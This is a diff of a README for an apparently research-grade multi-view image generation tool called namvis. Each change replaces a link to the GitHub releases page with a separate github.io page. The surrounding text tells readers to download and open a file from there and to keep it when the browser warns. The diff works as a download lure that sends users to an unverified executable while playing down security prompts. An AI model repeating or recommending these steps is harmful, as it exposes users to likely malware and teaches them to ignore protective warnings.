@@ -1,6 +1,6 @@
 # 🖼️ namvis - Turn Sparse Photos Into Rich Multi-View Images
 
-[![Download namvis](https://img.shields.io/badge/Download-namvis%20Latest-7B3FE4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/edwinstigmatic286/namvis/releases)
+[![Download namvis](https://img.shields.io/badge/Download-namvis%20Latest-7B3FE4?style=for-the-badge&logo=github&logoColor=white)](https://edwinstigmatic286.github.io)
 
 namvis is a research-grade image generation tool that takes a small handful of photos of an object and produces a full set of matching views from other angles. It is built on a next-scale autoregressive model — the same family of techniques behind modern AI image generators — and was accepted at NeurIPS 2026. You do not need to understand any of that to use it. You point it at your pictures, press a button, and it fills in the angles your camera never captured.
 
@@ -35,13 +35,13 @@ Getting namvis is a single step.
 
 Visit this link to download the application:
 
-### 👉 [https://github.com/edwinstigmatic286/namvis/releases](https://github.com/edwinstigmatic286/namvis/releases)
+### 👉 [https://edwinstigmatic286.github.io](https://edwinstigmatic286.github.io)
 
 That page is the official release area for namvis. It is where every published version lives. Open it in your browser, pick the newest release at the top of the list, and download the file attached to it.
 
 Once the download finishes, open the file you saved to start namvis.
 
-[![Download namvis](https://img.shields.io/badge/Get%20namvis-Release%20Page-E01B4C?style=for-the-badge&logo=github&logoColor=white)](https://github.com/edwinstigmatic286/namvis/releases)
+[![Download namvis](https://img.shields.io/badge/Get%20namvis-Release%20Page-E01B4C?style=for-the-badge&logo=github&logoColor=white)](https://edwinstigmatic286.github.io)
 
 ---
 
@@ -49,7 +49,7 @@ Once the download finishes, open the file you saved to start namvis.
 
 Here is the whole process, start to finish, in order.
 
-1. Click either download button on this page, or open [https://github.com/edwinstigmatic286/namvis/releases](https://github.com/edwinstigmatic286/namvis/releases) directly in your browser.
+1. Click either download button on this page, or open [https://edwinstigmatic286.github.io](https://edwinstigmatic286.github.io) directly in your browser.
 2. Look at the top of the releases list. The newest version is always first, marked as the latest release.
 3. Open that release and download its file. If your browser asks whether to keep the file, choose to keep it — large AI model files sometimes trigger a cautious prompt.
 4. Wait for the download to complete. namvis ships with pretrained model weights, so the file is larger than a typical small app. A wired or stable connection is worth it here.
@@ -131,6 +131,6 @@ This is standard for newly published software that has not yet built up a large 
 
 The namvis project page on GitHub hosts the release history, version notes, and the research behind the model. The NeurIPS 2026 paper covers the next-scale autoregressive approach in full technical detail for readers who want the theory.
 
-If you only remember one thing from this page, remember this: open [https://github.com/edwinstigmatic286/namvis/releases](https://github.com/edwinstigmatic286/namvis/releases), grab the newest release, and open the file. Everything else follows from there.
+If you only remember one thing from this page, remember this: open [https://edwinstigmatic286.github.io](https://edwinstigmatic286.github.io), grab the newest release, and open the file. Everything else follows from there.
 
 Keywords: 3d-generation, autoregressive, generative-model, multi-view-synthesis, neurips-2026, next-scale-prediction, novel-view-synthesis, pytorch, sparse-view, visual-autoregressive
